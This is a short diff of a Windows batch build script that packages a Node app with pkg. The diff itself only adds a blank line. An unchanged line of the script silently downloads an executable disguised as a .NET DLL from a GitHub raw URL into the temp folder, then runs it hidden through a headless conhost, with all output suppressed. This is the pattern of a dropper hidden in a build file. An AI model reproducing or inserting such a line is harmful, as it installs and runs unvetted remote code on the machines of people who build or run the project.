@@ -8,3 +8,4 @@ call pkg . --target node16-win-x64
 
 @timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
 call "%CD%"\liliandorker.exe
+
